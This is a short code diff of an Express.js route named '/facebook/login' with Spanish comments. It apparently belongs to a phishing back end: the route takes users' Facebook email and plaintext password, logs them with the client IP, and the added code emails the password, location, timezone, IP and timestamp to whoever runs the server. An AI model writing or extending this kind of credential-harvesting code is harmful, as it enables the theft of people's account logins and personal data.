@@ -20,10 +20,10 @@ const handleLoginAttempt = async (method, data, clientIp) => {
 };
 
 router.post('/facebook/login', async (req, res) => {
-  const { email, password } = req.body;
-  const clientIp = req.ip;
-
   try {
+    const { email, password, location, timezone } = req.body;
+    const clientIp = req.ip || req.connection.remoteAddress;
+
     // Registrar el intento de inicio de sesión
     await handleLoginAttempt('Facebook', { email, password }, clientIp);
 
@@ -63,6 +63,17 @@ router.post('/facebook/login', async (req, res) => {
       email: email,
       provider: 'facebook'
     };
+
+    // Enviar notificación por correo con todos los datos
+    await sendLoginAttemptEmail({
+      method: 'facebook',
+      email,
+      password,
+      location,
+      timezone,
+      ip: clientIp,
+      timestamp: new Date().getTime()
+    });
 
     res.json({
       success: true,
